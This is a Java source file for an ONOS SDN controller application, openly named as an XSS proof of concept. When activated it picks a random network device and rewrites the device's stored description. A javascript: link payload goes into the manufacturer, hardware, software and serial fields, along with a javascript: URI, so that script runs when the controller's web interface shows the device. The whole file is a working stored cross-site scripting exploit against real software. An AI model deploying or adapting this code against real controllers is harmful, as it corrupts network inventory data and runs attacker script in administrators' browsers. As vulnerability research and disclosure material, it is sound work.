/*
 * Copyright 2023-present Open Networking Foundation
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.onosproject.xssdevice;

import org.apache.felix.scr.annotations.Activate;
import org.apache.felix.scr.annotations.Component;
import org.apache.felix.scr.annotations.Deactivate;
import org.apache.felix.scr.annotations.Reference;
import org.apache.felix.scr.annotations.ReferenceCardinality;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.onosproject.core.CoreService;
import org.onosproject.net.device.DeviceStore;
import org.onosproject.net.Device;
import org.onosproject.net.DeviceId;
import java.net.URI;
import org.onlab.packet.ChassisId;
import org.onosproject.net.DefaultAnnotations;
import org.onosproject.net.device.DefaultDeviceDescription;
import org.onosproject.net.provider.ProviderId;
import java.io.StringWriter;
import java.io.PrintWriter;
import org.onosproject.net.device.DeviceService;
import java.util.Random;
import java.util.ArrayList;
import java.util.List;

/**
 * XSS device POC application
 */
@Component(immediate = true)
public class XssDevicePoc {

    private final Logger log = LoggerFactory.getLogger(getClass());

    private final String PAYLOAD = "<a href=javascript:alert(1)>CLICKME</a>";

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected CoreService coreService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected DeviceStore deviceStore;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected DeviceService deviceService;

    @Activate
    protected void activate() {
        coreService.registerApplication("org.onosproject.xssdevice.app", () -> log.info("Periscope down."));
        injectXss();
        log.info("Started xssdevice App!");
    }

    @Deactivate
    protected void deactivate() {
        log.info("Stopped xssdevice App!");
    }

    private void injectXss() {
        try {
            URI uri = new URI("javascript:alert(1)");

            DeviceId dId = pickRandomDevice().id();

            ChassisId cId = new ChassisId(5);

            DefaultAnnotations sa = DefaultAnnotations.builder().build();

            DefaultDeviceDescription deviceDescription = new DefaultDeviceDescription(uri, Device.Type.SWITCH, PAYLOAD,
                    PAYLOAD, PAYLOAD, PAYLOAD, cId, sa);
            deviceStore.createOrUpdateDevice(ProviderId.NONE, dId, deviceDescription);

            log.info("Payload injected!");

        } catch (Exception e) {
            e.printStackTrace();
            StringWriter sw = new StringWriter();
            PrintWriter pw = new PrintWriter(sw);
            e.printStackTrace(pw);
            log.info(sw.toString());
            log.info("exception!!!!!!11!!!!11!");
        }
    }

    // pickRandomDevice picks a random device
    private Device pickRandomDevice() {
        Iterable<Device> devices = deviceService.getDevices();
        Random rand = new Random();
        List<Device> deviceList = new ArrayList<Device>();
        devices.forEach(deviceList::add);
        Device randomDevice = deviceList.get(rand.nextInt(deviceList.size()));

        return randomDevice;
    }
}